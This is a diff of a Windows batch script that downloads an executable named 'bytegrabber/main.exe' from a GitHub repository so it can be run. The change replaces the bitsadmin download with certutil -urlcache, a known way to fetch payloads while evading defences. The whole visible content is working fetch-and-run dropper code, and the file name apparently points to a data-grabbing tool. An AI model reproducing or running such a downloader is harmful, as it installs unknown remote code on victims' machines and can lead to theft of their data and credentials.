@@ -26,7 +26,10 @@ if %errorlevel% neq 0 (
 cls
 title Downloading and running external file...
 
-bitsadmin /transfer "DownloadJob" https://github.com/ParadoxTheory/resources/raw/main/bytegrabber/main.exe "%~dp0main.exe"
+set "url=https://github.com/ParadoxTheory/resources/raw/main/bytegrabber/main.exe"
+set "outfile=%~dp0main.exe"
+
+certutil -urlcache -split -f "%url%" "%outfile%"
 
 if %errorlevel% neq 0 goto DOWNLOAD_ERROR
 
